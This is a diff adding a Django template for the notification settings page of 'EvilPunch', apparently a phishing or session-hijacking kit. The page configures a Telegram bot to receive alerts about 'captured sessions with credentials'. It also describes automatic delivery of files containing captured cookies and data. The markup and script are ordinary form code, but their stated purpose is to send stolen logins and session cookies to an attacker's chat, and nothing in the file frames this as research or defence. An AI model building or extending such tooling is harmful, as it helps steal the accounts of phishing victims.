@@ -1,0 +1,227 @@
+{% extends 'base.html' %}
+
+{% block title %}Notification Settings - EvilPunch{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card card-dark">
+            <div class="card-header">
+                <h4 class="mb-0"><i class="fas fa-bell me-2"></i>Notification Settings</h4>
+            </div>
+            <div class="card-body">
+                <form method="post">
+                    {% csrf_token %}
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="telegram_bot_token" class="form-label">
+                                    <i class="fab fa-telegram me-2"></i>Telegram Bot Token
+                                </label>
+                                <input type="text" 
+                                       class="form-control" 
+                                       id="telegram_bot_token" 
+                                       name="telegram_bot_token" 
+                                       value="{{ settings.telegram_bot_token|default:'' }}"
+                                       placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+                                       required>
+                                <div class="form-text text-muted">
+                                    Get this from <a href="https://t.me/BotFather" target="_blank">@BotFather</a> on Telegram
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="telegram_chat_id" class="form-label">
+                                    <i class="fas fa-comments me-2"></i>Telegram Chat ID
+                                </label>
+                                <input type="text" 
+                                       class="form-control" 
+                                       id="telegram_chat_id" 
+                                       name="telegram_chat_id" 
+                                       value="{{ settings.telegram_chat_id|default:'' }}"
+                                       placeholder="123456789 or -1001234567890"
+                                       required>
+                                <div class="form-text text-muted">
+                                    Your personal chat ID or group chat ID where notifications will be sent
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <div class="form-check form-switch">
+                            <input class="form-check-input" 
+                                   type="checkbox" 
+                                   id="is_active" 
+                                   name="is_active" 
+                                   {% if settings.is_active %}checked{% endif %}>
+                            <label class="form-check-label" for="is_active">
+                                <i class="fas fa-toggle-on me-2"></i>Enable Notifications
+                            </label>
+                        </div>
+                        <div class="form-text text-muted">
+                            When enabled, notifications will be sent for important events
+                        </div>
+                    </div>
+                    
+                    <div class="d-flex gap-2">
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-save me-2"></i>Save Settings
+                        </button>
+                        <button type="button" class="btn btn-outline-info" onclick="testNotification()">
+                            <i class="fas fa-paper-plane me-2"></i>Test Notification
+                        </button>
+                    </div>
+                </form>
+                
+                <hr class="my-4">
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="card card-dark">
+                            <div class="card-header">
+                                <h6 class="mb-0"><i class="fas fa-info-circle me-2"></i>How to Setup</h6>
+                            </div>
+                            <div class="card-body">
+                                <ol class="mb-0">
+                                    <li>Create a bot with <a href="https://t.me/BotFather" target="_blank">@BotFather</a></li>
+                                    <li>Get your bot token</li>
+                                    <li>Start a chat with your bot or add it to a group</li>
+                                    <li>Get your chat ID using <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a></li>
+                                    <li>Save the settings and test</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <div class="card card-dark">
+                            <div class="card-header">
+                                <h6 class="mb-0"><i class="fas fa-list me-2"></i>Notification Events</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="mb-0">
+                                    <li>🚨 New captured sessions with credentials</li>
+                                    <li>📎 Session data files (cookies, custom data)</li>
+                                    <li>🔄 Session updates with message editing</li>
+                                    <li>🔌 Proxy status changes</li>
+                                    <li>🖥️ Server status changes</li>
+                                    <li>⚠️ Error alerts</li>
+                                    <li>🧪 Test notifications</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <hr class="my-4">
+                
+                <div class="row">
+                    <div class="col-12">
+                        <div class="card card-dark">
+                            <div class="card-header">
+                                <h6 class="mb-0"><i class="fas fa-star me-2"></i>Enhanced Features</h6>
+                            </div>
+                            <div class="card-body">
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <h6><i class="fas fa-file-alt me-2"></i>File Attachments</h6>
+                                        <p class="text-muted mb-3">
+                                            When sessions capture cookies or custom data, the system automatically creates 
+                                            and sends detailed text files containing all captured information.
+                                        </p>
+                                        
+                                        <h6><i class="fas fa-edit me-2"></i>Message Editing</h6>
+                                        <p class="text-muted mb-3">
+                                            Instead of sending multiple notifications for session updates, the system 
+                                            intelligently edits existing messages to keep your chat clean and organized.
+                                        </p>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <h6><i class="fas fa-database me-2"></i>Smart Caching</h6>
+                                        <p class="text-muted mb-3">
+                                            Message IDs are cached to enable seamless editing and updates, 
+                                            reducing notification spam while maintaining real-time information.
+                                        </p>
+                                        
+                                        <h6><i class="fas fa-bell me-2"></i>Real-time Updates</h6>
+                                        <p class="text-muted mb-3">
+                                            Get instant notifications for credential captures, cookie changes, 
+                                            and session modifications as they happen.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Test Notification Modal -->
+<div class="modal fade" id="testNotificationModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Test Notification</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div id="testResult"></div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function testNotification() {
+    const resultDiv = document.getElementById('testResult');
+    resultDiv.innerHTML = '<div class="text-center"><i class="fas fa-spinner fa-spin fa-2x"></i><p class="mt-2">Sending test notification...</p></div>';
+    
+    // Show modal
+    const modal = new bootstrap.Modal(document.getElementById('testNotificationModal'));
+    modal.show();
+    
+    // Send test request
+    fetch('{% url "test_notification" %}', {
+        method: 'POST',
+        headers: {
+            'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value,
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({})
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            resultDiv.innerHTML = `
+                <div class="alert alert-success">
+                    <i class="fas fa-check-circle me-2"></i>${data.message}
+                </div>
+            `;
+        } else {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-circle me-2"></i>${data.error}
+                </div>
+            `;
+        }
+    })
+    .catch(error => {
+        resultDiv.innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-circle me-2"></i>Error: ${error.message}
+            </div>
+        `;
+    });
+}
+</script>
+{% endblock %}
